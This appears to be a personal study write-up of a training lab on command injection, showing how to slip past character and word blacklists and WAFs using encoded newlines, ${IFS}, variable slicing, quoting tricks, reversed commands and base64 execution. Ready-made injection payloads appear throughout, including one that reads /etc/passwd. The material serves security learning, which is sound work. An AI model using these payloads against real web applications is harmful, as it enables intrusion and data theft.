# 🦹‍♂️ Filter Evasion

A type of injection mitigation is utilizing blacklisted characters and words on the back-end to detect injection attempts and deny the request if any request contained them.

### Filter/WAF Detection

Let's take a boosted version of our host checker with thome mitigations ->

<figure><img src="../../../.gitbook/assets/image (1307).png" alt=""><figcaption></figcaption></figure>

This could be the back end code that checks for those chars:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Bypass Blacklisted Spaces

We see that the newline operators does not block our request:

<figure><img src="../../../.gitbook/assets/image (1308).png" alt=""><figcaption></figcaption></figure>

But with the whoami added, and the space encoded it still blocks:

<figure><img src="../../../.gitbook/assets/image (1309).png" alt=""><figcaption></figcaption></figure>

So let's get rid off whoami and check if the space is the char blocking:

<figure><img src="../../../.gitbook/assets/image (1310).png" alt=""><figcaption></figcaption></figure>

It's good to know that Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments so let's try `127.0.0.1%0a%09`

<figure><img src="../../../.gitbook/assets/image (1311).png" alt=""><figcaption></figcaption></figure>

Let's try with another technique Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work. `127.0.0.1%0a${IFS}`

<figure><img src="../../../.gitbook/assets/image (1312).png" alt=""><figcaption></figcaption></figure>

There are many other methods we can utilize to bypass space filters, we can use the `Bash Brace Expansion`

```shell-session
ElFelixi0@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

_**Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?**_

<figure><img src="../../../.gitbook/assets/image (1313).png" alt=""><figcaption><p>127.0.0.1%0a{ls,-la}</p></figcaption></figure>

## Bypass Blacklisted Characters

### Linux

`${IFS}` is a magical environment variable but there are not that for other interesting chars, let's get creative and use the variables we know to get our chars through the filters ->

```shell-session
ElFelixi0@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So if we print our&#x20;

```shell-session
ElFelixi0@htb[/htb]$ echo ${PATH:0:1}

/
```

And we can't forget `$HOME` or `$PWD`

```shell-session
ElFelixi0@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

<figure><img src="../../../.gitbook/assets/image (1314).png" alt=""><figcaption><p>${LS_COLORS:10:1}${IFS}</p></figcaption></figure>

### Windows

we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`)

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

### Character Shifting

This is a nice techniques to produce the required characters without using them

all we have to do is find the character in the ASCII table that is just before our needed character

```shell-session
ElFelixi0@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
ElFelixi0@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

_**Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?**_

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

## Bypassing Blacklisted Commands

A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.

Here is the code for a basic command blacklist:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

this code is looking for an exact match of the provided command, so if we send a slightly different command, it may not get blocked.

### Linux & Windows

It's good to know that `'` and a double-quote `"`are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command as if they were not there.

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i

21y4d

# OR --------------------------

21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

{% hint style="danger" %}
The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Linux Only

The chars that are not taken in account by bash include the backslash `\` and the positional parameter character `$@`. This works exactly as it did with the quotes, but in this case, `the number of characters do not have to be even`

```bash
who$@ami
w\ho\am\i
```

### Windows Only

(`^`) can be injected

```cmd-session
C:\htb> who^ami

21y4d
```

_**Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.**_

```
ip=127.0.0.1%0ac"a"t,${PATH:0:1}home${PATH:0:1}flag.txt%0aw"ho"ami
```

## Advanced Command Obfuscation

When dealing with Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work

We can try inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word

with a Windows server PowerShell and CMD are case-insensitive

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

However, when it comes to Linux and a bash shell, which are case-sensitive So we can try&#x20;

```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

So if we try it in burp:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It does not work because of the spaces disguised as +

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can try the follwoing command as well

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

### Reversed Commands

Another fun way of playing around with WAFs is to reverse the commands

```shell-session
ElFelixi0@htb[/htb]$ echo 'whoami' | rev
imaohw
```

So we can create a environment variable:

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The same can be applied in `Windows`

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

### Encoded Commands

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding).

```shell-session
ElFelixi0@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

ElFelixi0@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We use the same technique with Windows as well.

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

_**Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1**_

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>bash&#x3C;&#x3C;&#x3C;$(base64%0a-d&#x3C;&#x3C;&#x3C;ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE)</p></figcaption></figure>

But for some reason it does not execute my command

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption><p>ip=127.0.0.1%0abash&#x3C;&#x3C;&#x3C;$(base64%09-d&#x3C;&#x3C;&#x3C;ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)</p></figcaption></figure>

I forgot the %09
